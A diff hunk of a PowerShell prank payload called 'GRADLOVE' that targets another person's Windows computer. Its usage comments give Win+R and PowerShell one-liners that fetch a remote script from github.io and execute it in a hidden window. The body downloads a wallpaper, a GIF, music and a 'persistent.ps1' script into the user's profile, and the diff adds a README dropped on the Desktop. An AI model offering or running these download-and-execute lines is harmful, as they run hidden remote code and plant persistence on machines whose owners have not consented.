@@ -1,30 +1,35 @@
 # USAGE:
 # Win + R:
-# powershell -w h -c ". ([Scriptblock]::Create((([System.Text.Encoding]::ASCII).getString((Invoke-WebRequest -Uri "https://juanbanpar.github.io/GRADLOVE/amor.ps1").Content))))"
+# powershell -w h -c ". ([Scriptblock]::Create((([System.Text.Encoding]::ASCII).getString((Invoke-WebRequest -Uri "https://juanbanpar.github.io/GRADLOVE/real-amor.ps1").Content))))"
 # Powershell:
-# . ([Scriptblock]::Create((([System.Text.Encoding]::ASCII).getString((Invoke-WebRequest -Uri "https://juanbanpar.github.io/GRADLOVE/amor.ps1").Content))))
+# . ([Scriptblock]::Create((([System.Text.Encoding]::ASCII).getString((Invoke-WebRequest -Uri "https://juanbanpar.github.io/GRADLOVE/real-amor.ps1").Content))))
 
 $Data = @{
     WallpaperURL              = "https://juanbanpar.github.io/GRADLOVE/files/wall.jpg"
     GifURL                    = "https://juanbanpar.github.io/GRADLOVE/files/heart-locket.gif"
     MusicURL                  = "https://juanbanpar.github.io/GRADLOVE/files/music.wav"
     PersistentURL             = "https://juanbanpar.github.io/GRADLOVE/files/persistent.ps1"
-    DownloadDirectory         = "C:\amor"
+    ReadmeURL                 = "https://juanbanpar.github.io/GRADLOVE/README_WINDOWS.txt"
+    DownloadDirectory         = "%USERPROFILE%\amor"
+    ReadmeDirectory           = "%USERPROFILE%\Desktop"
 }
 
 $WallpaperDest  = $($Data.DownloadDirectory + "\Wallpaper." + ($Data.WallpaperURL -replace ".*\."))
 $GifDest  = $($Data.DownloadDirectory + "\Gif." + ($Data.GifURL -replace ".*\."))
 $MusicDest = $($Data.DownloadDirectory + "\Music." + ($Data.MusicURL -replace ".*\."))
 $PersistentDest = $($Data.DownloadDirectory + "\Persistent." + ($Data.PersistentURL -replace ".*\."))
+$ReadmeDest = $($Data.ReadmeDirectory + "\README." + ($Data.ReadmeURL -replace ".*\."))
 
 # Creates the LOVE folder on the target computer
 New-Item -ItemType Directory -Path $Data.DownloadDirectory -ErrorAction SilentlyContinue
+New-Item -ItemType Directory -Path $Data.ReadmeDirectory -ErrorAction SilentlyContinue
 
 # Downloads SO MUCH LOVE
 Start-BitsTransfer -Source $Data.WallpaperURL -Destination $WallpaperDest
 Start-BitsTransfer -Source $Data.GifURL -Destination $GifDest
 Start-BitsTransfer -Source $Data.MusicURL -Destination $MusicDest
 Start-BitsTransfer -Source $Data.PersistentURL -Destination $PersistentDest
+Start-BitsTransfer -Source $Data.ReadmeURL -Destination $ReadmeDest
 
 # Function of LOVE
 Function Set-WallPaper {
